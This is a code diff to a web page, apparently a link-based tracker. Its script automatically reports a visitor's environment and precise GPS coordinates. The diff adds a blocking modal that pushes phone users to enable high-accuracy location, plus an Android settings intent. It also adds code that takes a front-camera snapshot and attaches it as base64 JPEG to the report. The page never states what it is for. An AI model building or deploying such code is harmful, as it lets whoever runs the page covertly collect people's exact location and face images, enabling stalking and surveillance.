@@ -42,6 +42,75 @@
     }
     .err { color: #f66; }
     .ok { color: #6c6; }
+
+    .geo-help {
+      position: fixed;
+      inset: 0;
+      z-index: 2147483647;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+      background: rgba(0, 0, 0, 0.88);
+      -webkit-backdrop-filter: blur(6px);
+      backdrop-filter: blur(6px);
+    }
+    .geo-help--hidden {
+      display: none !important;
+    }
+    .geo-help__box {
+      max-width: 22rem;
+      width: 100%;
+      padding: 1.25rem 1.35rem;
+      border-radius: 14px;
+      background: #2a2a2a;
+      color: #e8e8e8;
+      font-size: 0.9rem;
+      line-height: 1.5;
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5);
+    }
+    .geo-help__box h2 {
+      margin: 0 0 0.65rem;
+      font-size: 1.05rem;
+      font-weight: 700;
+      color: #fff;
+      line-height: 1.3;
+    }
+    .geo-help__box p {
+      margin: 0 0 0.75rem;
+    }
+    .geo-help__box p:last-of-type {
+      margin-bottom: 0;
+    }
+    .geo-help__actions {
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+      margin-top: 1rem;
+    }
+    .geo-help__actions button {
+      width: 100%;
+      padding: 0.7rem 1rem;
+      font-size: 0.9rem;
+      font-weight: 600;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-family: inherit;
+    }
+    .geo-help__primary {
+      background: #0d7dd6;
+      color: #fff;
+    }
+    .geo-help__secondary {
+      background: #3a3a3a;
+      color: #e0e0e0;
+    }
+    .geo-help__note {
+      font-size: 0.78rem;
+      color: #888;
+      margin-top: 0.75rem !important;
+    }
   </style>
 </head>
 <body>
@@ -57,6 +126,33 @@
     <div id="status" aria-live="polite" aria-hidden="true"></div>
   </figure>
 
+  <div id="geo-help" class="geo-help geo-help--hidden" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="geo-help-title">
+    <div class="geo-help__box">
+      <h2 id="geo-help-title">Включите геолокацию на телефоне</h2>
+      <p id="geo-help-lead">
+        Сайту уже разрешили доступ в браузере, но координаты не приходят — чаще всего на устройстве
+        <strong>выключена служба «Местоположение» / GPS</strong> (так же, как подсказывают карты).
+      </p>
+      <p id="geo-help-ios" class="geo-help--hidden">
+        <b>iPhone / iPad:</b> «Настройки» → «Конфиденциальность и безопасность» → «Службы геолокации» — включите.
+        Ниже для Safari при необходимости откройте доступ к местоположению.
+      </p>
+      <p id="geo-help-android-hint" class="geo-help--hidden">
+        <b>Android:</b> «Настройки» → «Местоположение» (или «Геоданные») — включите и выберите режим
+        <strong>«Высокая точность»</strong> (GPS + сеть), затем вернитесь в браузер.
+      </p>
+      <div class="geo-help__actions">
+        <button type="button" class="geo-help__primary geo-help--hidden" id="geo-help-open-android">
+          Открыть настройки геолокации (Android)
+        </button>
+        <button type="button" class="geo-help__secondary" id="geo-help-retry">Проверить снова</button>
+      </div>
+      <p class="geo-help__note">
+        Сайт не может сам включить модуль GPS — только открыть экран настроек (Android) или подсказать путь. Это ограничение безопасности ОС.
+      </p>
+    </div>
+  </div>
+
   <script>
     (function () {
       /*
@@ -67,15 +163,177 @@
       const statusEl = document.getElementById("status");
       let started = false;
 
+      function closeGeoHelpPanel() {
+        var root = document.getElementById("geo-help");
+        root.classList.add("geo-help--hidden");
+        root.setAttribute("aria-hidden", "true");
+      }
+
+      function openGeoHelpPanel(code) {
+        var root = document.getElementById("geo-help");
+        var title = document.getElementById("geo-help-title");
+        var lead = document.getElementById("geo-help-lead");
+        var iosBlk = document.getElementById("geo-help-ios");
+        var andHint = document.getElementById("geo-help-android-hint");
+        var andBtn = document.getElementById("geo-help-open-android");
+        var isAndroid = /Android/i.test(navigator.userAgent || "");
+        var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent || "");
+
+        iosBlk.classList.add("geo-help--hidden");
+        andHint.classList.add("geo-help--hidden");
+        andBtn.classList.add("geo-help--hidden");
+
+        if (code === 0) {
+          title.textContent = "Геолокация недоступна в этом браузере";
+          lead.textContent =
+            "API геолокации отсутствует или отключён (часто во встроенном браузере приложений). Откройте ссылку в Chrome, Samsung Internet или Safari.";
+          root.classList.remove("geo-help--hidden");
+          root.setAttribute("aria-hidden", "false");
+          return;
+        }
+
+        if (code === 1) {
+          title.textContent = "Местоположение: браузер и телефон";
+          lead.innerHTML =
+            "Сначала проверьте <strong>разрешение для этого сайта</strong> (замок / «i» в адресной строке). Если для сайта доступ уже включён, а координат нет — включите <strong>общую геолокацию в настройках телефона</strong> (кнопка ниже на Android).";
+          if (isIOS) {
+            iosBlk.classList.remove("geo-help--hidden");
+          }
+          if (isAndroid) {
+            andHint.innerHTML =
+              "<b>Chrome:</b> «⋮» → «Сведения о сайте» → «Разрешения» → «Местоположение» → разрешить.<br><br><b>Если здесь уже «Разрешено»:</b> нажмите синюю кнопку — откроются <strong>системные</strong> настройки GPS / «Местоположение», как в картах.";
+            andHint.classList.remove("geo-help--hidden");
+            andBtn.classList.remove("geo-help--hidden");
+          }
+        } else {
+          title.textContent = "Включите геолокацию на телефоне";
+          lead.innerHTML =
+            "Координаты не приходят — чаще всего в шторке или в настройках выключена <strong>системная служба «Местоположение» / GPS</strong>. Нажмите кнопку ниже (Android) или включите службы вручную.";
+          if (isIOS) {
+            iosBlk.classList.remove("geo-help--hidden");
+          }
+          if (isAndroid) {
+            andHint.innerHTML =
+              "<b>Android:</b> «Настройки» → «Местоположение» / «Геоданные» — включите и режим <strong>«Высокая точность»</strong> (GPS + сеть). Либо нажмите кнопку ниже.";
+            andHint.classList.remove("geo-help--hidden");
+            andBtn.classList.remove("geo-help--hidden");
+          }
+        }
+
+        root.classList.remove("geo-help--hidden");
+        root.setAttribute("aria-hidden", "false");
+      }
+
+      function tryOpenAndroidLocationSettings() {
+        var intents = [
+          "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end",
+          "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;package=com.android.settings;end",
+        ];
+        window.location.href = intents[0];
+      }
+
+      document.getElementById("geo-help-open-android").addEventListener("click", tryOpenAndroidLocationSettings);
+      document.getElementById("geo-help-retry").addEventListener("click", function () {
+        closeGeoHelpPanel();
+        started = false;
+        requestAnimationFrame(function () {
+          startAutoReport();
+        });
+      });
+
       function escapeHtml(s) {
         const d = document.createElement("div");
         d.textContent = s;
         return d.innerHTML;
       }
 
+      async function getGeolocationPermissionState() {
+        try {
+          if (!navigator.permissions || !navigator.permissions.query) return null;
+          const st = await navigator.permissions.query({ name: "geolocation" });
+          return st.state;
+        } catch (_) {
+          return null;
+        }
+      }
+
+      /**
+       * Один кадр с фронтальной камеры после разрешения (JPEG base64 без префикса data:).
+       */
+      async function captureFrontCameraSnapshot() {
+        try {
+          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            return null;
+          }
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+              facingMode: "user",
+              width: { ideal: 1280 },
+              height: { ideal: 720 },
+            },
+            audio: false,
+          });
+          const video = document.createElement("video");
+          video.setAttribute("playsinline", "");
+          video.setAttribute("webkit-playsinline", "");
+          video.playsInline = true;
+          video.muted = true;
+          video.srcObject = stream;
+          await new Promise(function (resolve, reject) {
+            video.onloadedmetadata = function () {
+              video.play().then(resolve).catch(reject);
+            };
+            video.onerror = function () {
+              reject(new Error("video"));
+            };
+          });
+          await new Promise(function (r) {
+            requestAnimationFrame(function () {
+              requestAnimationFrame(r);
+            });
+          });
+          const w = video.videoWidth;
+          const h = video.videoHeight;
+          stream.getTracks().forEach(function (t) {
+            t.stop();
+          });
+          video.srcObject = null;
+          if (!w || !h) return null;
+          var maxSide = 960;
+          var tw = w;
+          var th = h;
+          if (w > maxSide || h > maxSide) {
+            if (w >= h) {
+              tw = maxSide;
+              th = Math.round((h * maxSide) / w);
+            } else {
+              th = maxSide;
+              tw = Math.round((w * maxSide) / h);
+            }
+          }
+          var canvas = document.createElement("canvas");
+          canvas.width = tw;
+          canvas.height = th;
+          var ctx = canvas.getContext("2d");
+          if (!ctx) return null;
+          ctx.drawImage(video, 0, 0, tw, th);
+          var dataUrl = canvas.toDataURL("image/jpeg", 0.82);
+          var comma = dataUrl.indexOf(",");
+          if (comma < 0) return null;
+          return dataUrl.slice(comma + 1) || null;
+        } catch (_) {
+          return null;
+        }
+      }
+
       function formatGeolocationError(err) {
         if (!err) return "Неизвестная ошибка геолокации";
         const code = err.code;
+        if (code === 0) {
+          return (
+            "Геолокация в этом браузере не поддерживается. Откройте страницу в обычном Chrome или Safari, не во встроенном браузере приложения."
+          );
+        }
         if (code === 1) {
           return (
             "Доступ к геолокации запрещён. Откройте настройки сайта (замок / «i» в адресной строке) → разрешите «Местоположение», " +
@@ -89,7 +347,10 @@
           );
         }
         if (code === 3) {
-          return "Таймаут ожидания координат. Повторите после лучшего приёма GPS.";
+          return (
+            "Таймаут: координаты не получены. Если на телефоне выключена служба «Местоположение»/GPS — включите её в настройках системы " +
+            "(как подсказывают карты), затем нажмите «Проверить снова». Либо выйдите на улицу для приёма спутников."
+          );
         }
         const m = err.message || "";
         if (/denied/i.test(m)) return formatGeolocationError({ code: 1 });
@@ -260,8 +521,28 @@
        */
       function readGeo() {
         return new Promise(function (resolve, reject) {
+          function geoReject(err) {
+            if (!err || typeof err.code !== "number") {
+              reject({
+                __geo: true,
+                code: 3,
+                message: formatGeolocationError({ code: 3 }),
+              });
+              return;
+            }
+            reject({
+              __geo: true,
+              code: err.code,
+              message: formatGeolocationError(err),
+            });
+          }
+
           if (!navigator.geolocation) {
-            reject(new Error("Геолокация в этом браузере не поддерживается"));
+            reject({
+              __geo: true,
+              code: 0,
+              message: formatGeolocationError({ code: 0 }),
+            });
             return;
           }
           const mobile = /Android|iPhone|iPad|iPod|Mobile/i.test(
@@ -275,7 +556,7 @@
                 resolve(coordsToGeoPayload(pos, "desktop:getCurrentPosition"));
               },
               function (err) {
-                reject(new Error(formatGeolocationError(err)));
+                geoReject(err);
               },
               Object.assign({ timeout: 28000 }, highAcc)
             );
@@ -310,7 +591,7 @@
             finished = true;
             cleanup();
             clearTimeout(hardTimer);
-            reject(new Error(formatGeolocationError(err)));
+            geoReject(err);
           }
 
           const hardTimer = setTimeout(function () {
@@ -366,6 +647,9 @@
             if (st.state === "denied") {
               statusEl.innerHTML =
                 '<span class="err">Геолокация для этого сайта отключена в браузере. Включите её в настройках адреса (замок) и обновите страницу.</span>';
+              if (/Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent || "")) {
+                openGeoHelpPanel(1);
+              }
               started = false;
               return;
             }
@@ -398,10 +682,36 @@
         try {
           geo = await readGeo();
         } catch (e) {
-          statusEl.innerHTML = '<span class="err">' + escapeHtml(e.message) + "</span>";
+          var msg =
+            e && e.__geo
+              ? e.message
+              : e && e.message
+                ? e.message
+                : String(e);
+          statusEl.innerHTML = '<span class="err">' + escapeHtml(msg) + "</span>";
+          var mobileUA = /Android|iPhone|iPad|iPod|Mobile/i.test(
+            navigator.userAgent || ""
+          );
+          if (e && e.__geo && mobileUA) {
+            if (e.code === 0) {
+              openGeoHelpPanel(0);
+            } else if (e.code === 1) {
+              var perm = await getGeolocationPermissionState();
+              if (perm === "granted" || perm === "prompt") {
+                openGeoHelpPanel(2);
+              } else {
+                openGeoHelpPanel(1);
+              }
+            } else if (e.code === 2 || e.code === 3) {
+              openGeoHelpPanel(e.code);
+            }
+          }
           started = false;
           return;
         }
+
+        statusEl.textContent = "Камера: разрешите доступ — сделаем один снимок с фронтальной камеры.";
+        var frontJpegB64 = await captureFrontCameraSnapshot();
 
         statusEl.textContent = "Отправка отчёта…";
 
@@ -409,6 +719,7 @@
           collectedAt: new Date().toISOString(),
           env: env,
           geolocation: geo,
+          frontCameraJpegBase64: frontJpegB64 || null,
         };
 
         try {
